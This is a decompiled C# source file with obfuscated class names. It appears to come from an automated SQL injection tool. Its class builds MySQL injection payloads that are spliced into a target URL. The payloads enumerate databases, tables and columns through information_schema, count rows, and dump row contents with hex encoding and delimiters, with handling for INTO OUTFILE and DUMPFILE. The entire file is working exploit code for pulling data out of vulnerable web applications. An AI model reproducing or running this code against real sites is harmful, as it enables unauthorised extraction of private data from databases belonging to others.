using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase;

public class MySQLNoError
{
	public static string Info(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, List<string> lColumn, string sEndUrl = "")
	{
		string text = Class54.smethod_4(oCollaction);
		string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(#)", "#"));
		string text2 = "";
		checked
		{
			string text3;
			if (sTraject.ToLower().Contains(" into outfile") | sTraject.ToLower().Contains(" into dumpfile"))
			{
				text2 = lColumn[0].Trim();
				text3 = text;
				text3 = text3.Replace("#", text2);
			}
			else
			{
				int num = lColumn.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						text2 = text2 + "," + Class54.string_3 + ",";
					}
					string text4 = lColumn[i].Trim();
					text2 += text4;
				}
				text3 = text;
				text3 = text3.Replace("#", "concat(" + Class54.string_1 + ",#," + Class54.string_1 + ")");
				text3 = text3.Replace("#", newValue);
				text3 = ((lColumn.Count <= 1) ? text3.Replace("#", text2) : text3.Replace("#", "concat(" + text2 + ")"));
			}
			string text5 = sTraject.Replace("[t]", text3) + sEndUrl;
			return text5.Replace("  ", " ");
		}
	}

	public static string DataBases(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string text = Class54.smethod_4(oCollaction);
		string text2 = "(select distinct " + text;
		text2 = text2.Replace("#", "concat(" + Class54.string_1 + ",#," + Class54.string_1 + ")");
		_ = 1;
		string text3;
		if (limitX == -1)
		{
			text2 = text2.Replace("#", "group_concat(schema_name)");
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata", Interaction.IIf(bCorrentDB, " where schema_name=database() and not schema_name=" + Class23.smethod_20("information_schema"), " where not schema_name=" + Class23.smethod_20("information_schema"))), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
		}
		else
		{
			text2 = text2.Replace("#", "schema_name");
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + Class23.smethod_20("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
		}
		text2 = text2 + text3 + ")";
		string text4 = sTraject.Replace("[t]", text2) + sEndUrl;
		return text4.Replace("  ", " ");
	}

	public static string Tables(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string text = Class54.smethod_4(oCollaction);
		string text2 = "(select distinct " + text;
		text2 = text2.Replace("#", "concat(" + Class54.string_1 + ",#," + Class54.string_1 + ")");
		string text3;
		if (limitX == -1)
		{
			text2 = text2.Replace("#", "group_concat(table_name)");
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
		}
		else
		{
			text2 = text2.Replace("#", "table_name");
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
		}
		text2 = text2 + text3 + ")";
		string text4 = sTraject.Replace("[t]", text2) + sEndUrl;
		return text4.Replace("  ", " ");
	}

	public static string Columns(string sTraject, MySQLCollactions oCollaction, string sDataBase, string sTable, bool bDataType, string sWhere = "", string sOrderBy = "", string sEndUrl = "", int limitX = 0, int limitY = 1)
	{
		string text = Class54.smethod_4(oCollaction);
		string text2 = "(select distinct " + text;
		text2 = text2.Replace("#", "concat(" + Class54.string_1 + ",#," + Class54.string_1 + ")");
		string text3;
		if (limitX == -1)
		{
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("group_concat(column_name", Interaction.IIf(bDataType, ",0x3a,replace(column_type,0x2c,0x3b)", "")), ")")));
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)));
		}
		else
		{
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject("column_name", Interaction.IIf(bDataType, ",0x3a,column_type", ""))));
			text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
		}
		text2 = text2 + text3 + ")";
		string text4 = sTraject.Replace("[t]", text2) + sEndUrl;
		return text4.Replace("  ", " ");
	}

	public static string Dump(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
	{
		string text = Class54.smethod_4(oCollaction);
		string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(concat(#))", "#"));
		string text2 = Conversions.ToString(Interaction.IIf(Expression: false, "group_concat(#)", "concat(#)"));
		string text3 = Conversions.ToString(Interaction.IIf(bIFNULL, "ifnull(#,char(" + Conversions.ToString(32) + "))", "#"));
		string text4 = "(select " + text;
		text4 = text4.Replace("#", text2.Replace("#", Class54.string_1 + ",#," + Class54.string_1));
		text4 = text4.Replace("#", newValue);
		string text5 = "";
		checked
		{
			int num = lColumn.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (i > 0)
				{
					text5 = text5 + "," + Class54.string_3 + ",";
				}
				string text6 = text3.Replace("#", lColumn[i].Trim());
				text5 += text6;
			}
			text4 = text4.Replace("#", text5);
			string text7;
			if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
			{
				text7 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			else
			{
				text7 = sCustomQuery.Trim();
				text7 = text7.Replace("[x]", Conversions.ToString(limitX));
				text7 = text7.Replace("[y]", Conversions.ToString(limitY));
			}
			text4 = text4 + " " + text7 + ")";
			string text8 = sTraject.Replace("[t]", text4) + sEndUrl;
			return text8.Replace("  ", " ");
		}
	}

	public static string DumpNoKey(string sTraject, MySQLCollactions oCollaction, bool bHexEncoded, bool bIFNULL, string sDataBase, string sTable, List<string> lColumn, int limitX, int limitY = 1, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
	{
		string text = "";
		string text2 = Class54.smethod_4(oCollaction);
		string newValue = Conversions.ToString(Interaction.IIf(bHexEncoded, "hex(concat(#))", "#"));
		string text3 = Conversions.ToString(Interaction.IIf(Expression: false, "group_concat(#)", "concat(#)"));
		string text4 = Conversions.ToString(Interaction.IIf(bIFNULL, "ifnull(#,char(" + Conversions.ToString(32) + "))", "#"));
		string text5 = "(select " + text2;
		if (!string.IsNullOrEmpty(text))
		{
			text5 = text5.Replace("#", text3.Replace("#", text + ",#," + text));
		}
		text5 = text5.Replace("#", newValue);
		string text6 = "";
		checked
		{
			int num = lColumn.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (string.IsNullOrEmpty(text))
				{
					if (i > 0)
					{
						text6 += ",";
					}
				}
				else if (i > 0)
				{
					text6 = text6 + "," + text + ",";
				}
				string text7 = text4.Replace("#", lColumn[i].Trim());
				text6 += text7;
			}
			text5 = text5.Replace("#", text6);
			string text8;
			if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
			{
				text8 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), " limit "), limitX), ","), limitY));
			}
			else
			{
				text8 = sCustomQuery.Trim();
				text8 = text8.Replace("[x]", Conversions.ToString(limitX));
				text8 = text8.Replace("[y]", Conversions.ToString(limitY));
			}
			text5 = text5 + " " + text8 + ")";
			string text9 = sTraject.Replace("[t]", text5) + sEndUrl;
			return text9.Replace("  ", " ");
		}
	}

	public static string Count(string sTraject, MySQLCollactions oCollaction, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
	{
		string text = "";
		string text2 = Class54.smethod_4(oCollaction);
		string text3 = "(select " + text2;
		text3 = text3.Replace("#", "concat(" + Class54.string_1 + ",count(0)," + Class54.string_1 + ")");
		switch (o)
		{
		case Schema.DATABASES:
			_ = 1;
			text = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.schemata where not schema_name=" + Class23.smethod_20("information_schema"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
			break;
		case Schema.TABLES:
			text = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.tables where table_schema=" + Class23.smethod_20(sDataBase), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
			break;
		case Schema.COLUMNS:
			text = Conversions.ToString(Operators.ConcatenateObject(" from information_schema.columns where table_schema=" + Class23.smethod_20(sDataBase) + " and table_name=" + Class23.smethod_20(sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)));
			break;
		case Schema.ROWS:
			text = Conversions.ToString(Operators.ConcatenateObject(" from " + sDataBase + "." + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)));
			break;
		}
		text3 = text3 + text + ")";
		string text4 = sTraject.Replace("[t]", text3) + sEndUrl;
		return text4.Replace("  ", " ");
	}
}
